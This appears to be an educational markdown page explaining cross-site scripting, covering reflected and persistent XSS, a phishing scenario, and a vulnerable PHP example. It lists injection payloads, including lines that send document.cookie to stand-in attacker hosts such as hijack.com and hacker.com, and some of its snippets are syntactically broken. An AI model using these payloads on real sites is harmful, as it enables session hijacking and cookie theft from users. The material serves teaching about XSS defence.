<h1 align="center"> 🌐 Cross-Site Scripting (XSS) attack 🌐 </h1>

<img align="right" width="50%" src="https://spanning.com/wp-content/uploads/2019/05/cross-site-scripting-example.png">

```yaml
vulnerabilty: Cross-site Scripting 

attack's type: injection

tool: code

how: inject malicious scripts

where: website's forms and inputs

To : user victim

through: phishing link

For: user's infos (cookies)

```

















<br><br><br><br><br><br><br><br><br><h1 align="center">🌐 Demonstration 🌐</h1>
<p>Suppose you have web application that obtains a user name and reflects it back to a web page. Suppose that instead of just entering your name 
  "Imène", the input was:</p>

```html
Imène<script>alert(document.cookie)</script>
```

<p>When the page is loaded, the script will execute <br>
• Popping up a dialog containing the document cookie is relatively harmless, but this script can be anything the attacker chooses<br>
• To perpetrate an exploit, the attacker will try to get others to come to this page (maybe with phishing attacks)</p>
<p>• The attack could have been avoided by doing the following:<br>
– Removing the script upon input<br>
– Neutralizing the script when the HTML is output</p>




















<br><br><br><br><br><br><br><br><br><h1 align="center">🌐 Get into The Attack 🌐</h1>

<p>A Cross-Site Scripting (XSS) exploit is an attack on the user,not the site. But liability means that the site is responsible <br>
  • If the XSS string is input and then reflected back to the user,it is called <b>Reflected XSS</b>.For example, a URL that leads a victim to a site that will 
  allow a script to execute on their browser</p>
  
  ```html
  http://…./app.html?name=Joe<script>alert(document.cookie)</script>
  ```
  <br><p>• An XSS attack that is stored somewhere, such as in a database, and can be exploited at some later time, is called a <b>Persistent XSS</b></p>
  <br></p>There are many ways to inject XSS strings into HTML. Any HTML attribute that can contain JavaScript can be the vehicle for an XSS attack.Examples:
  
  ```html
<body onload="alert(document.cookie)">
<img src=“javascript:alert(document.cookie)">
<img src onerror="alert(document.cookie)">
<META HTTP-EQUIV=“refresh” CONTENT=“0;url=data:tex/html;<script>alert(‘attack’)</script>
```

<br><p>What makes XSS dangerous is the damage that can be done by a script executing in the browser of an unsuspecting user.<br>
• Cookie theft<br>
• Redirection<br>
• Defacing sites<br>
• Browser appropriation<br>
• Keystroke recording<br>
• Launching further attacks against others<br>
• Accessing the local file system</p>

















<br><br><br><br><br><br><br><br><br><h1 align="center">🌐 XSS Types 🌐</h1>
<br><p>•XSS vulnerabilities fall into two categories, To perpetrate an XSS attack an attacker can use:</p>
<table>
  <tr>
    <td><b> A persistent attack</b></td>
    <td colspan='10'>where the data is permanantly located in a file system or database</td>
  </tr>
  
  <tr>
    <td><b>A non-persistent attack (Reflected XSS) </b></td>
    <td colspan='10'>where the attack vector is inserted into the data stream but not stored</td>
  </tr>
</table>


<p>Based primarily on whether they are one-off attacks or can be used repeatedly.</p>
<br><br><h3>Reflected XSS</h3>
<p>
–Parameters from a request are used improperly, resulting in a script running and harvesting data from the submitter.<br>
–The attacker buries malicious queries in a page using links, I-frames, …
</p>

<br><br><h3>A non-persistent example</h3>
<p>
– Fred notices that bbq.com has a reflected XSS vulnerability and creates a URL that exploits it.<br>
– Fred sends an email to Ted enticing Ted to click on it.<br>
– Ted does so.<br>
– The bbq.com sends Ted’s client a page that contains a script that executes and sends Ted’s session cookie to Fred’s site.<br>
– Fred can now access bbq.com as Ted (at least for a while).</p>

```html
http://bbq.com?prod=grill&name=<script>http://asite.com?sid=document.cookie()</script>
```
The server code, does something like this.
```python
print ("Thanks for your interest in %s",name);
```

```html
<?setcookie ("xss1", "42");?>
<HTML>
  <BODY>
    <h3>Welcome to The BBQ</H3>
    <BR>
    <?
      $prod=$_GET['prod'];
      $name=$_GET['name'];
      print ("We appreciate your interest in our $name grills<BR>");
      print ("What can we help you with today<BR>");
    ?>
  </BODY>
</HTML>
  ```
```html
…/xss1.php?prod=grill&name=<script>document.location=http://hijack.com/save?name=“ + document.cookie</script>
```
<br><br><h3> Persistent XSS</h3>
<p>
–The attacker injects code on the server that when downloaded to the client allows further mischief.<br>
–As before, but its embedded in a message on the server. Such as a blog or social networking message site.</p>
<p>There are other ways to insert Javascript:</p>

```html
<img src=“javascript:alert(document.cookie);”>
<a href="javascript: alert(document.cookie);">Click here to win</a>
<input type=“button” value=“submit” onclick="parent.location.reload(‘http://hacker.com?c’=encodeURI(document.cookie));">
```
<br><p><b>Inline Javascript:</b></p>
  
  ```html
<html>
  <body>
    <h3>XSS version 2</h3>
      <form>
        First Name<input type="text" name="firstname" />
        <br>
        Second Name<input type="text" name="secondname" />
        <br>
        <input type="BUTTON" VALUE="Submit" onclick="alert(document.cookie)"/>
  </body>
</html>
```
  
 <p>You are looking for an input that lets you feed an exploit back to the page.<br>
• Some document elements have properties like <b>OnClick,OnLoad, OnChange, OnSubmit, OnMove, OnKeyPress</b> and so on.<br>
• These are by definition, Javascript, without any specific tags.</p>

```html
<html>
  <body>
    <h3>XSS version 3</h3>
    <img src="no_such_file.jpg" onerror=alert(document.cookie);>
  </body>
</html>
```
    
```html
<html>
  <body onload=alert(document.cookie);>
    <h3>XSS version 4</h3>
  </body>
</html>
```
    








<br><br><br><br><br><br><br><br><br><h1 align="center">🌐 Hackers objectives through XSS 🌐</h1>
<br><p>The objective is to insert JavaScript into a data stream so that it executes in the users browser.The client system is open to attack, but so is any site with open valid sessions in the client.</p>
<p>• The executable code can:<br>
–Redirect to another site.<br>
–Execute something that attacks the victim’s system.<br>
–Execute something that collects data from the victim.<br>
–Modify the browser representation to lead the user to undesirable sites.</p>
<p>• The typical outcomes are: <br>
–Private data harvesting.<br>
–Session data interception.<br>
–Site vandalism.<br>
  
 
